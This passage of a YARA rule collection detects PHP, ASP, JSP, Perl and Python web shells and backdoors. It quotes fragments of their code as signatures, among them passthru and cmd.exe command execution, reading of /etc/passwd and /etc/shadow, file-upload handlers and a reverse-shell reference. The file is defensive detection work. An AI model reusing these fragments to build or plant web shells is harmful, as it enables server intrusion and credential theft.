        $s0 = "<?$d='G7mHWQ9vvXiL/QX2oZ2VTDpo6g3FYAa6X+8DMIzcD0eHZaBZH7jFpZzUz7XNenxSYvBP2Wy36U"
    condition:
        all of them
}
rule kacak_asp {
    meta:
        id = "5IoHYlN8jj3sAxviaJJzyT"
        fingerprint = "v1_sha256_8542a3985dff2d1eb42f4d2c9f30405a4817a8e30075225c518ec52381f1f7df"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file kacak.asp.txt"
        category = "INFO"
        hash = "907d95d46785db21331a0324972dda8c"

    strings:
        $s0 = "Kacak FSO 1.0"
        $s1 = "if request.querystring(\"TGH\") = \"1\" then"
        $s3 = "<font color=\"#858585\">BuqX</font></a></font><font face=\"Verdana\" style="
        $s4 = "mailto:BuqX@hotmail.com"
    condition:
        1 of them
}
rule PHP_Backdoor_Connect_pl_php {
    meta:
        id = "1EIdknqrLjN6cQwbhNo54r"
        fingerprint = "v1_sha256_b141546f45767884f9c8b1cc4c09ea25f90c0f3a3633bfeecad78b60e7f20306"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file PHP Backdoor Connect.pl.php.txt"
        category = "INFO"
        hash = "57fcd9560dac244aeaf95fd606621900"

    strings:
        $s0 = "LorD of IRAN HACKERS SABOTAGE"
        $s1 = "LorD-C0d3r-NT"
        $s2 = "echo --==Userinfo==-- ;"
    condition:
        1 of them
}
rule Antichat_Socks5_Server_php_php {
    meta:
        id = "1u7tHDTrFFwi2LRWQFqWeF"
        fingerprint = "v1_sha256_d6b203561f95f431b3d2c241011ae08c05619d45c5900a28137481c029e8297e"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file Antichat Socks5 Server.php.php.txt"
        category = "INFO"
        hash = "cbe9eafbc4d86842a61a54d98e5b61f1"

    strings:
        $s0 = "$port = base_convert(bin2hex(substr($reqmessage[$id], 3+$reqlen+1, 2)), 16, 10);" fullword
        $s3 = "#   [+] Domain name address type"
        $s4 = "www.antichat.ru"
    condition:
        1 of them
}
rule Antichat_Shell_v1_3_php {
    meta:
        id = "3gyFeEkdgMAGkTpyQBS2S1"
        fingerprint = "v1_sha256_566c324f3bf44ce9f32ddad82a8d3daa87a8a75b5ca0c8286bc912a8ae4ac8e9"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file Antichat Shell v1.3.php.txt"
        category = "INFO"
        hash = "40d0abceba125868be7f3f990f031521"

    strings:
        $s0 = "Antichat"
        $s1 = "Can't open file, permission denide"
        $s2 = "$ra44"
    condition:
        2 of them
}
rule Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2_php {
    meta:
        id = "1YStfo3YgaM4dqrsvnQ5Ak"
        fingerprint = "v1_sha256_d6d2a3999f2e8ceb70f57697c0a845edbbcfce0aba151ec6a0ac23f55265cd47"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php.txt"
        category = "INFO"
        hash = "49ad9117c96419c35987aaa7e2230f63"

    strings:
        $s0 = "Welcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy"
        $s1 = "Mode Shell v1.0</font></span>"
        $s2 = "has been already loaded. PHP Emperor <xb5@hotmail."
    condition:
        1 of them
}
rule mysql_php_php {
    meta:
        id = "3C6Ze9Jrp3OIRR1xpGWV8u"
        fingerprint = "v1_sha256_60e235310f378698ffcc3ae6a07ab5dd94a660ca4b1504cc878d9741f751d5d1"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file mysql.php.php.txt"
        category = "INFO"
        hash = "12bbdf6ef403720442a47a3cc730d034"

    strings:
        $s0 = "action=mysqlread&mass=loadmass\">load all defaults"
        $s2 = "if (@passthru($cmd)) { echo \" -->\"; $this->output_state(1, \"passthru"
        $s3 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = "
    condition:
        1 of them
}
rule Worse_Linux_Shell_php {
    meta:
        id = "4WZjjuSkyf97jhJhJERCV"
        fingerprint = "v1_sha256_47801296b700e85f9e08857eb06f845ef8ed3f88b7d0de34d4b7c47cef6cc7fb"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file Worse Linux Shell.php.txt"
        category = "INFO"
        hash = "8338c8d9eab10bd38a7116eb534b5fa2"

    strings:
        $s1 = "print \"<tr><td><b>Server is:</b></td><td>\".$_SERVER['SERVER_SIGNATURE'].\"</td"
        $s2 = "print \"<tr><td><b>Execute command:</b></td><td><input size=100 name=\\\"_cmd"
    condition:
        1 of them
}
rule cyberlords_sql_php_php {
    meta:
        id = "Vy6hTgUcCMJWK4Gl7EZB8"
        fingerprint = "v1_sha256_b3286f9fd86c90c5afc79801b6d65c9ae52ee1c37da93ff15461d84f37ef8019"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file cyberlords_sql.php.php.txt"
        category = "INFO"
        hash = "03b06b4183cb9947ccda2c3d636406d4"

    strings:
        $s0 = "Coded by n0 [nZer0]"
        $s1 = " www.cyberlords.net"
        $s2 = "U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAMUExURf///wAAAJmZzAAAACJoURkAAAAE"
        $s3 = "return \"<BR>Dump error! Can't write to \".htmlspecialchars($file);"
    condition:
        1 of them
}
rule cmd_asp_5_1_asp {
    meta:
        id = "1anA1lqHwKNwaQqjn85nUW"
        fingerprint = "v1_sha256_a41c83da1a65e67b6f4ac6ad7cc8702486957ab0c7dda658d071e603338c324b"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file cmd-asp-5.1.asp.txt"
        category = "INFO"
        hash = "8baa99666bf3734cbdfdd10088e0cd9f"

    strings:
        $s0 = "Call oS.Run(\"win.com cmd.exe /c del \"& szTF,0,True)" fullword
        $s3 = "Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &" fullword
    condition:
        1 of them
}
rule pws_php_php {
    meta:
        id = "ZEO96w77qWwaiYHoNFups"
        fingerprint = "v1_sha256_98dae8aab5bfd58f4264e318f5a5b5900b38687386f9d7f09c31da0f51d57bc0"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file pws.php.php.txt"
        category = "INFO"
        hash = "ecdc6c20f62f99fa265ec9257b7bf2ce"

    strings:
        $s0 = "<div align=\"left\"><font size=\"1\">Input command :</font></div>" fullword
        $s1 = "<input type=\"text\" name=\"cmd\" size=\"30\" class=\"input\"><br>" fullword
        $s4 = "<input type=\"text\" name=\"dir\" size=\"30\" value=\"<? passthru(\"pwd\"); ?>"
    condition:
        2 of them
}
rule PHP_Shell_php_php {
    meta:
        id = "7O4xB5dtp19gJAwrWjVdNd"
        fingerprint = "v1_sha256_2d5b6e08bfe9e1551dab12b01189dadc924c097427c996684bab96c48d528395"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file PHP Shell.php.php.txt"
        category = "INFO"
        hash = "a2f8fa4cce578fc9c06f8e674b9e63fd"

    strings:
        $s0 = "echo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input"
        $s1 = "echo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type="
    condition:
        all of them
}
rule Ayyildiz_Tim___AYT__Shell_v_2_1_Biz_html {
    meta:
        id = "5LFpQNgkYOAZA9H7jZ9PjR"
        fingerprint = "v1_sha256_9e2d56b49df65a2c13e15f97ec91cdbb6852d86e86f921d7c8a4db82cbea12f5"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file Ayyildiz Tim  -AYT- Shell v 2.1 Biz.html.txt"
        category = "INFO"
        hash = "8a8c8bb153bd1ee097559041f2e5cf0a"

    strings:
        $s0 = "Ayyildiz"
        $s1 = "TouCh By iJOo"
        $s2 = "First we check if there has been asked for a working directory"
        $s3 = "http://ayyildiz.org/images/whosonline2.gif"
    condition:
        2 of them
}
rule EFSO_2_asp {
    meta:
        id = "5i7Shr4lNoO32kHDzWOiK2"
        fingerprint = "v1_sha256_15e5419854bcbb08f28fff1e266cca7a004f01ec0a5c313c107ec17c3aa7ffee"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file EFSO_2.asp.txt"
        category = "INFO"
        hash = "b5fde9682fd63415ae211d53c6bfaa4d"

    strings:
        $s0 = "Ejder was HERE"
        $s1 = "*~PU*&BP[_)f!8c2F*@#@&~,P~P,~P&q~8BPmS~9~~lB~X`V,_,F&*~,jcW~~[_c3TRFFzq@#@&PP,~~"
    condition:
        2 of them
}
rule lamashell_php {
    meta:
        id = "7XSCyMMALHem51kLScPbxV"
        fingerprint = "v1_sha256_5e156c3057338fa7b306b91dd979851dd56b8b698cfe99e1d7b6d096a4c580e7"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file lamashell.php.txt"
        category = "INFO"
        hash = "de9abc2e38420cad729648e93dfc6687"

    strings:
        $s0 = "lama's'hell" fullword
        $s1 = "if($_POST['king'] == \"\") {"
        $s2 = "if (move_uploaded_file($_FILES['fila']['tmp_name'], $curdir.\"/\".$_FILES['f"
    condition:
        1 of them
}
rule Ajax_PHP_Command_Shell_php {
    meta:
        id = "61s1dWPAFmFfIIayA5GcLl"
        fingerprint = "v1_sha256_37cba26018f3d37194a143871012a61a7bcee6775d2cf5f93a52b779010d3260"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file Ajax_PHP Command Shell.php.txt"
        category = "INFO"
        hash = "93d1a2e13a3368a2472043bd6331afe9"

    strings:
        $s1 = "newhtml = '<b>File browser is under construction! Use at your own risk!</b> <br>"
        $s2 = "Empty Command..type \\\"shellhelp\\\" for some ehh...help"
        $s3 = "newhtml = '<font size=0><b>This will reload the page... :(</b><br><br><form enct"
    condition:
        1 of them
}
rule JspWebshell_1_2_jsp {
    meta:
        id = "150fuDsnvd6Mebjh43xwMV"
        fingerprint = "v1_sha256_32b3ddb00f89a3540118fe8ce5fc070556b00030dcf2b21245d38ae66e6cbc14"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file JspWebshell 1.2.jsp.txt"
        category = "INFO"
        hash = "70a0ee2624e5bbe5525ccadc467519f6"

    strings:
        $s0 = "JspWebshell"
        $s1 = "CreateAndDeleteFolder is error:"
        $s2 = "<td width=\"70%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.c"
        $s3 = "String _password =\"111\";"
    condition:
        2 of them
}
rule Sincap_php_php {
    meta:
        id = "2XkggKnsenNkpJ5NYqql2K"
        fingerprint = "v1_sha256_e708a7dcb26ff7d0208c1f092e14e701f2ae94c4ffca019f13064bbe04ef74d7"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file Sincap.php.php.txt"
        category = "INFO"
        hash = "b68b90ff6012a103e57d141ed38a7ee9"

    strings:
        $s0 = "$baglan=fopen(\"/tmp/$ekinci\",'r');"
        $s2 = "$tampon4=$tampon3-1"
        $s3 = "@aventgrup.net"
    condition:
        2 of them
}
rule Test_php_php {
    meta:
        id = "6e2zUgulkxzNIIYJsIPuIe"
        fingerprint = "v1_sha256_575a2eeadc8113d779057f98e978ed4f8914546117b57944bf65f1d6d84c9521"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file Test.php.php.txt"
        category = "INFO"
        hash = "77e331abd03b6915c6c6c7fe999fcb50"

    strings:
        $s0 = "$yazi = \"test\" . \"\\r\\n\";" fullword
        $s2 = "fwrite ($fp, \"$yazi\");" fullword
        $s3 = "$entry_line=\"HACKed by EntriKa\";" fullword
    condition:
        1 of them
}
rule Phyton_Shell_py {
    meta:
        id = "1rNSFyMVc5kNULvMHxI8mF"
        fingerprint = "v1_sha256_ac16a95cd1fb09c93b315e3cd7d57c1ebec322b641f515854fb73a61393dd365"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file Phyton Shell.py.txt"
        category = "INFO"
        hash = "92b3c897090867c65cc169ab037a0f55"

    strings:
        $s1 = "sh_out=os.popen(SHELL+\" \"+cmd).readlines()" fullword
        $s2 = "#   d00r.py 0.3a (reverse|bind)-shell in python by fQ" fullword
        $s3 = "print \"error; help: head -n 16 d00r.py\"" fullword
        $s4 = "print \"PW:\",PW,\"PORT:\",PORT,\"HOST:\",HOST" fullword
    condition:
        1 of them
}
rule mysql_tool_php_php {
    meta:
        id = "7Mp15Emou9LpXBAaio6HgR"
        fingerprint = "v1_sha256_9f49bd6c56c919f678ecada82ff3d801c82c98a8abdee85cda1ec7e5b6756012"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file mysql_tool.php.php.txt"
        category = "INFO"
        hash = "5fbe4d8edeb2769eda5f4add9bab901e"

    strings:
        $s0 = "$error_text = '<strong>Failed selecting database \"'.$this->db['"
        $s1 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERV"
        $s4 = "<div align=\"center\">The backup process has now started<br "
    condition:
        1 of them
}
rule Zehir_4_asp {
    meta:
        id = "7KFvJgGycDPkuxvkboGDqz"
        fingerprint = "v1_sha256_69063d866daf1709df81fa22d76177bf8d552e19725a94db4a1b2fca79387faf"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file Zehir 4.asp.txt"
        category = "INFO"
        hash = "7f4e12e159360743ec016273c3b9108c"

    strings:
        $s2 = "</a><a href='\"&dosyapath&\"?status=10&dPath=\"&f1.path&\"&path=\"&path&\"&Time="
        $s4 = "<input type=submit value=\"Test Et!\" onclick=\""
    condition:
        1 of them
}
rule sh_php_php {
    meta:
        id = "65jDec6YWGY7cWO6Kfz9eQ"
        fingerprint = "v1_sha256_b0c3307d451e5d7dadece114e2888503a46038e2edb2ff32bf566ce47b300e76"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file sh.php.php.txt"
        category = "INFO"
        hash = "330af9337ae51d0bac175ba7076d6299"

    strings:
        $s1 = "$ar_file=array('/etc/passwd','/etc/shadow','/etc/master.passwd','/etc/fstab','/e"
        $s2 = "Show <input type=text size=5 value=\".((isset($_POST['br_st']))?$_POST['br_st']:"
    condition:
        1 of them
}
rule phpbackdoor15_php {
    meta:
        id = "6wbcFttV11T4PcA98cx5rD"
        fingerprint = "v1_sha256_cdd105f36593e8326ca32bf7cf1fba6fb754e7305c91fe6c078323db8f59b23c"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file phpbackdoor15.php.txt"
        category = "INFO"
        hash = "0fdb401a49fc2e481e3dfd697078334b"

    strings:
        $s1 = "echo \"fichier telecharge dans \".good_link(\"./\".$_FILES[\"fic\"][\"na"
        $s2 = "if(move_uploaded_file($_FILES[\"fic\"][\"tmp_name\"],good_link(\"./\".$_FI"
        $s3 = "echo \"Cliquez sur un nom de fichier pour lancer son telechargement. Cliquez s"
    condition:
        1 of them
}
rule phpjackal_php {
    meta:
        id = "53Lh8L2suggVqoQsC2saim"
        fingerprint = "v1_sha256_6e2ff262aecd08e5feaa274a7fd128d75565d6cc03341da7cbeb2949070705e5"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file phpjackal.php.txt"
        category = "INFO"
        hash = "ab230817bcc99acb9bdc0ec6d264d76f"

    strings:
        $s3 = "$dl=$_REQUEST['downloaD'];"
        $s4 = "else shelL(\"perl.exe $name $port\");"
    condition:
        1 of them
}
rule sql_php_php {
    meta:
        id = "2YBqEWiqow1L3nVGX4CcK4"
        fingerprint = "v1_sha256_875bdaa0072f869c983526d0aab20b4faa9187a3f32b8024658114a4c908b825"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file sql.php.php.txt"
        category = "INFO"
        hash = "8334249cbb969f2d33d678fec2b680c5"

    strings:
        $s1 = "fputs ($fp, \"# RST MySQL tools\\r\\n# Home page: http://rst.void.ru\\r\\n#"
        $s2 = "http://rst.void.ru"
        $s3 = "print \"<a href=\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&"
    condition:
        1 of them
}
rule cgi_python_py {
    meta:
        id = "7ODHdDDmU1AvbT821ehwUS"
        fingerprint = "v1_sha256_37c6c7db32a52c8a83ff85f0a50c6fa71e833b9e6d20b1f95e9512fe8bbd0aee"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file cgi-python.py.txt"
        category = "INFO"
        hash = "0a15f473e2232b89dae1075e1afdac97"

    strings:
        $s0 = "a CGI by Fuzzyman"
        $s1 = "\"\"\"+fontline +\"Version : \" + versionstring + \"\"\", Running on : \"\"\" + "
        $s2 = "values = map(lambda x: x.value, theform[field])     # allows for"
    condition:
        1 of them
}
rule ru24_post_sh_php_php {
    meta:
        id = "4y43USSnmjg3F1I5ORxxT0"
        fingerprint = "v1_sha256_e81e5345bbe07ca85c94a3d8411f0dd3c418689ccae7115c098f718f9093b3bf"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file ru24_post_sh.php.php.txt"
        category = "INFO"
        hash = "5b334d494564393f419af745dc1eeec7"

    strings:
        $s1 = "<title>Ru24PostWebShell - \".$_POST['cmd'].\"</title>" fullword
        $s3 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"id;pwd;uname -a"
        $s4 = "Writed by DreAmeRz" fullword
    condition:
        1 of them
}
rule DTool_Pro_php {
    meta:
        id = "7lQfseY1Qd1tJoUpQNsimd"
        fingerprint = "v1_sha256_e8f8b4ca2ab4607e700e897671fd230280763a70897b8ccfc31b3bcb7f2a1f4a"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file DTool Pro.php.txt"
        category = "INFO"
        hash = "366ad973a3f327dfbfb915b0faaea5a6"

    strings:
        $s0 = "r3v3ng4ns\\nDigite"
        $s1 = "if(!@opendir($chdir)) $ch_msg=\"dtool: line 1: chdir: It seems that the permissi"
        $s3 = "if (empty($cmd) and $ch_msg==\"\") echo (\"Comandos Exclusivos do DTool Pro\\n"
    condition:
        1 of them
}
rule telnetd_pl {
    meta:
        id = "2Xi2pSYtkUP3BATcqtWoa4"
        fingerprint = "v1_sha256_faf21758b311fa4c2d11cd60169e6c9a67282cf739b73664456691361a480419"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file telnetd.pl.txt"
        category = "INFO"
        hash = "5f61136afd17eb025109304bd8d6d414"

    strings:
        $s0 = "0ldW0lf" fullword
        $s1 = "However you are lucky :P"
        $s2 = "I'm FuCKeD"
        $s3 = "ioctl($CLIENT{$client}->{shell}, &TIOCSWINSZ, $winsize);#"
        $s4 = "atrix@irc.brasnet.org"
    condition:
        1 of them
}
rule php_include_w_shell_php {
    meta:
        id = "4x8IwiwdL0DHkWlUjFtgKQ"
        fingerprint = "v1_sha256_a63910d97b7ef447b2cadb7de12943d3dbb6eada27d3097b8acf58d9b65b6f60"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file php-include-w-shell.php.txt"
        category = "INFO"
        hash = "4e913f159e33867be729631a7ca46850"

    strings:
        $s0 = "$dataout .= \"<td><a href='$MyLoc?$SREQ&incdbhost=$myhost&incdbuser=$myuser&incd"
        $s1 = "if($run == 1 && $phpshellapp && $phpshellhost && $phpshellport) $strOutput .= DB"
    condition:
        1 of them
}
rule Safe0ver_Shell__Safe_Mod_Bypass_By_Evilc0der_php {
    meta:
        id = "68LxvVpwxBoZyR42hl0UH8"
        fingerprint = "v1_sha256_46f6bb38f1175e02b03047c06a7aed968b1c1ce2e28cc4b88e15703040e91592"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file Safe0ver Shell -Safe Mod Bypass By Evilc0der.php.txt"
        category = "INFO"
        hash = "6163b30600f1e80d2bb5afaa753490b6"

    strings:
        $s0 = "Safe0ver" fullword
        $s1 = "Script Gecisi Tamamlayamadi!"
        $s2 = "document.write(unescape('%3C%68%74%6D%6C%3E%3C%62%6F%64%79%3E%3C%53%43%52%49%50%"
    condition:
        1 of them
}
rule shell_php_php {
    meta:
        id = "6XDViIkKqXPydt67DLdmms"
        fingerprint = "v1_sha256_dbd08e71dc512f8dcf009150fb4448cd3608291ef9078c7e6b86e6f8d820bd94"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file shell.php.php.txt"
        category = "INFO"
        hash = "1a95f0163b6dea771da1694de13a3d8d"

    strings:
        $s1 = "/* We have found the parent dir. We must be carefull if the parent " fullword
        $s2 = "$tmpfile = tempnam('/tmp', 'phpshell');"
        $s3 = "if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $command, $regs)) {" fullword
    condition:
        1 of them
}
rule telnet_cgi {
    meta:
        id = "5l3bl4cjFmtpf0DaGjZHLm"
        fingerprint = "v1_sha256_689c1d43c64aa7469989686c60fc9ab46acde42fdf3c1157bae1e2b8373c845f"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file telnet.cgi.txt"
        category = "INFO"
        hash = "dee697481383052980c20c48de1598d1"

    strings:
        $s1 = "W A R N I N G: Private Server"
        $s2 = "print \"Set-Cookie: SAVEDPWD=;\\n\"; # remove password cookie"
        $s3 = "$Prompt = $WinNT ? \"$CurrentDir> \" : \"[admin\\@$ServerName $C"
    condition:
        1 of them
}
rule ironshell_php {
    meta:
        id = "1TFFvDpCzNc2rkUxoVK1uj"
        fingerprint = "v1_sha256_23574299ee2bb33c3f71102adf71ac8f09b6f8ece5f798beacb9b2432d297ee7"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file ironshell.php.txt"
        category = "INFO"
        hash = "8bfa2eeb8a3ff6afc619258e39fded56"

    strings:
        $s0 = "www.ironwarez.info"
        $s1 = "$cookiename = \"wieeeee\";"
        $s2 = "~ Shell I"
        $s3 = "www.rootshell-team.info"
        $s4 = "setcookie($cookiename, $_POST['pass'], time()+3600);"
    condition:
        1 of them
}
rule backdoorfr_php {
    meta:
        id = "7VvfRut3Gro75bHHIamsQF"
        fingerprint = "v1_sha256_40a6fb41a65fd35acb7cdc36fdda90f5dc54b641adc3ba9eaae29c5e46622206"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file backdoorfr.php.txt"
        category = "INFO"
        hash = "91e4afc7444ed258640e85bcaf0fecfc"

    strings:
        $s1 = "www.victime.com/index.php?page=http://emplacement_de_la_backdoor.php , ou en tan"
        $s2 = "print(\"<br>Provenance du mail : <input type=\\\"text\\\" name=\\\"provenanc"
    condition:
        1 of them
}
rule aspydrv_asp {
    meta:
        id = "6GwyVXj9rCjtW5mZcM0M8"
        fingerprint = "v1_sha256_64912d7521d4bff33b5f3a78525bf4ed94246f5933753bed7ca02bedffc85f0f"
        version = "1.0"
        score = 60
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file aspydrv.asp.txt"
        category = "INFO"
        hash = "1c01f8a88baee39aa1cebec644bbcb99"

    strings:
        $s0 = "If mcolFormElem.Exists(LCase(sIndex)) Then Form = mcolFormElem.Item(LCase(sIndex))"
        $s1 = "password"
        $s2 = "session(\"shagman\")="
    condition:
        2 of them
}
rule cmdjsp_jsp {
    meta:
        id = "3MmSYEt0WLJd0fdcpasznP"
        fingerprint = "v1_sha256_8b0e425c7d71ea2c536192ff186665e7f0fbdbc0e0d195d7107ac57cf9bd1773"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file cmdjsp.jsp.txt"
        category = "INFO"
